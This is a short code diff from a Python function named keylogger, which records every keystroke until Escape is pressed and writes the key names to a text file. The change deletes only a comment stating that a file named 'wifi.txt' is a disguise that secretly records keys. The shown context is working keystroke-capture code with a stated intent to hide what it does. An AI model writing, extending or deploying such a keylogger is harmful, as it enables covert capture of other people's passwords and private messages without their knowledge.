@@ -11,7 +11,6 @@ def keylogger():
         key_events = keyboard.record(until='esc')
 
         # save the key events to a text file
-        # the “wifi.txt” folder is in disguise, it actually records the keys. 
         with open('keylogger.txt', 'w') as file:
             for key_event in key_events:
                 file.write(key_event.name + '\n')
